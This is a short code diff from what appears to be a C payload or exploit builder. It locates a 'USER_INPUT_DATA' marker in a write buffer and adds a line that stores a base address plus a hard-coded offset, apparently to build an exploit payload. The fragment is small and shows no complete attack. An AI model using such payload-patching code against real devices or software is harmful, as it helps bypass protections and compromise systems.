@@ -314,7 +314,7 @@ int main(int argc, char **argv) {
 
         char * userdata = msearch(writebuff, "USER_INPUT_DATA", 15);
         *(uint64_t*)userdata = start[1];
-        
+        *(uint64_t*)(userdata + 8) = start[0] + 0x892790;
 
         printf("useless zone: %x payloadsize: %d datadest: %x\n", useless_zone, writesize, start[1]);
 
